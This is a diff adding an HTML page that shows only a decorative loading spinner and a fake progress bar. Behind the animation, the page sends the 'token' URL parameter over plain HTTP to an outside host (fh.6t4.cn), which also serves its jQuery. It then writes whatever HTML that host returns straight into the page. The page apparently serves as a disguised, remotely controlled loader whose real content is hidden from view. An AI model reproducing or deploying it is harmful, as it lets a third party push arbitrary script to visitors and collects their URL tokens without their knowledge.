@@ -1,0 +1,147 @@
+<title>Hi！</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="description" content="">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<script src="//fh.6t4.cn/jquery.js"></script>
+<style>
+    /* 高端加载动画样式 */
+    .preloader {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: #f8f9fa;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        z-index: 9999;
+        transition: opacity 0.5s ease;
+    }
+    
+    .loader {
+        width: 80px;
+        height: 80px;
+        position: relative;
+    }
+    
+    .loader-inner {
+        position: absolute;
+        border: 4px solid transparent;
+        border-top-color: #3498db;
+        border-radius: 50%;
+        animation: spin 1.5s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
+    }
+    
+    .loader-inner:nth-child(1) {
+        width: 70px;
+        height: 70px;
+        animation-delay: 0.1s;
+    }
+    
+    .loader-inner:nth-child(2) {
+        width: 50px;
+        height: 50px;
+        top: 15px;
+        left: 15px;
+        animation-delay: 0.2s;
+        border-top-color: #e74c3c;
+    }
+    
+    .loader-inner:nth-child(3) {
+        width: 30px;
+        height: 30px;
+        top: 25px;
+        left: 25px;
+        animation-delay: 0.3s;
+        border-top-color: #f1c40f;
+    }
+    
+    @keyframes spin {
+        0% {
+            transform: rotate(0deg);
+        }
+        100% {
+            transform: rotate(360deg);
+        }
+    }
+    
+    .loading-text {
+        margin-top: 20px;
+        font-family: 'Arial', sans-serif;
+        font-size: 16px;
+        color: #333;
+        letter-spacing: 1px;
+    }
+    
+    .progress-bar {
+        width: 200px;
+        height: 4px;
+        background: #e0e0e0;
+        margin-top: 15px;
+        border-radius: 2px;
+        overflow: hidden;
+    }
+    
+    .progress {
+        height: 100%;
+        width: 0;
+        background: linear-gradient(90deg, #3498db, #2ecc71);
+        transition: width 0.3s ease;
+    }
+</style>
+
+<div class="preloader">
+    <div class="loader">
+        <div class="loader-inner"></div>
+        <div class="loader-inner"></div>
+        <div class="loader-inner"></div>
+    </div>
+    <div class="loading-text">加载中，请稍候...</div>
+    <div class="progress-bar">
+        <div class="progress" id="progress"></div>
+    </div>
+</div>
+
+<div id="msg"></div>
+
+<script>
+/**
+* 根据变量名获取匹配值
+*/
+function getQueryString(name) {
+    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
+    var r = window.location.search.substr(1).match(reg);
+    if (r != null) return unescape(r[2]); return null;
+} 
+
+// 模拟进度条更新
+function updateProgress() {
+    var progress = 0;
+    var interval = setInterval(function() {
+        progress += Math.random() * 10;
+        if (progress >= 90) {
+            clearInterval(interval);
+        }
+        document.getElementById('progress').style.width = progress + '%';
+    }, 300);
+}
+
+// 显示加载动画并开始请求
+document.addEventListener('DOMContentLoaded', function() {
+    updateProgress();
+    
+    var url = getQueryString("token");
+    
+    $.post("http://fh.6t4.cn/Cos/api.php", {url: url}, function(data) {
+        // 加载完成后淡出动画
+        document.querySelector('.preloader').style.opacity = '0';
+        setTimeout(function() {
+            document.querySelector('.preloader').style.display = 'none';
+            document.write(data.html);
+        }, 500);
+    }, "json");
+});
+      </script>
